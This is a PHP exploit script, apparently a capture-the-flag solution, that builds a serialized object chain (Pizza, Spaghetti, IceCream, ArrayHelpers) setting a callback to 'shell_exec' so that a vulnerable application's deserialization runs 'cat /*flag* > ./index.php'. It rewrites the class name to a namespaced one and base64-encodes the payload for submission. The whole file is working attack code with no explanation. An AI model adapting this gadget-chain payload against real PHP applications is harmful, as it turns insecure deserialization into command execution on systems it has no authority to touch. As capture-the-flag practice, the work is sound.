<?php
class ArrayHelpers extends ArrayIterator
{
	public $callback = "shell_exec";
}

class Pizza
{
	public $price;
	public $cheese;
	public $size;

}
	
class Spaghetti
{
    public $sauce;
    public $noodles;
    public $portion;
    
}

class IceCream
{
	public $flavors;
	public $topping;
}


$cmd = array(
	0 => "cat /*flag* > ./index.php"
	);

$pizza = new Pizza();
$spaghetti = new Spaghetti();
$icecream = new IceCream();
$icecream->flavors = new ArrayHelpers($cmd);
$spaghetti->sauce = $icecream;
$pizza->size = $spaghetti;

$my_payload = serialize($pizza);
$my_payload = str_replace('12:"ArrayHelpers"', '21:"\Helpers\ArrayHelpers"', $my_payload);
echo base64_encode($my_payload);
